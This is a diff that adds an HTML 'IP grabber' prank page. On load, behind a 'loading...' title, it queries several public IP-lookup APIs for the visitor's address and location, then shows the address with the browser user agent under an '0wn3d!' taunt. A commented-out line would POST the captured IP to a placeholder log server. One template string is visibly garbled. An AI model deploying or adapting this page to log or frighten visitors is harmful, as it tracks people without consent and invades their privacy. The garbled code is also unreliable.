@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>loading...</title>
+  <style>body{background:#000;color:#0f0;font-family:monospace;}</style>
+</head>
+<body>
+  <pre id="out">gr4bb1ng y0ur 1p... plz w41t</pre>
+
+  <script>
+  (async () => {
+    const out = document.getElementById('out');
+    const methods = [
+      // m057 r3l14bl3 fr33 4p15 (2026 w0rk1ng 57atu5)
+      ['https://api.ipify.org?format=json', r=>r.json().then(d=>d.ip)],
+      ['https://api64.ipify.org?format=json', r=>r.json().then(d=>d.ip)],
+      ['https://icanhazip.com/', r=>r.text()],
+      ['https://ipwho.is/', async r=>{
+        const d = await r.json();
+        return `\( {d.ip} ( \){d.city||'?'}, ${d.country||'?'})`;
+      }],
+      // f4llb4ck5
+      ['https://cloudflare.com/cdn-cgi/trace', async r=>{
+        const txt = await r.text();
+        const m = txt.match(/ip=(.+)/);
+        return m ? m[1] : 'n0 cl0udfl4r3 1p';
+      }]
+    ];
+
+    for (const [url, parser] of methods) {
+      try {
+        const res = await fetch(url, {cache:'no-store', mode:'cors'});
+        if (!res.ok) continue;
+        const ip = await parser(res);
+        if (ip && ip.trim() && ip !== 'undefined') {
+          out.innerHTML = 
+            `0wn3d!\n\n` +
+            `publ1c 1p  →  ${ip}\n` +
+            `t1m3574mp →  ${new Date().toISOString()}\n` +
+            `u53r-4g3n7 →  ${navigator.userAgent}\n` +
+            `l4ngu4g3  →  ${navigator.language}\n\n` +
+            `d0n7 cl0s3 th15 t4b y37 k1dd0 ツ`;
+          // 0p710n4l: s3nd 17 50m3wh3r3 (c0mm3n7 0ut unl355 y0u h4v3 4 l0g 53rv3r)
+          // fetch('https://your-log-server.here/log', {method:'POST',body:ip});
+          return;
+        }
+      } catch(e){}
+    }
+    
+    out.textContent = '4ll 4p15 d34d 0r bl0ck3d :(\ntry d15abl1ng 4d-bl0ck3r/vpn';
+  })();
+  </script>
+</body>
+</html>
